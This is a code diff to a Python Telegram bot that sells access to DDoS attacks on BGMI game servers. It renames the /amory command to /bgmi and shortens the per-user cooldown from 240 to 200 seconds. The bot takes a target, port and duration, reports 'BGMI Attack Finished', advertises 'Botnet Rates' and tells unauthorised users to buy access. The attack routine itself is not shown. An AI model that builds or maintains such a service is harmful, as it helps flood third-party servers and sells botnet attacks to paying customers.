@@ -285,10 +285,10 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =240
+COOLDOWN_TIME =200
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['amory'])
+@bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -296,7 +296,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown ❌. Please Wait 240 second from latest attack"
+                response = "You Are On Cooldown ❌. Please Wait 200 second from latest attack"
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -318,7 +318,7 @@ def handle_bgmi(message):
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /amory <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @rishabgupta01")
 
@@ -348,7 +348,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /amory : Method For Bgmi Servers. 
+💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
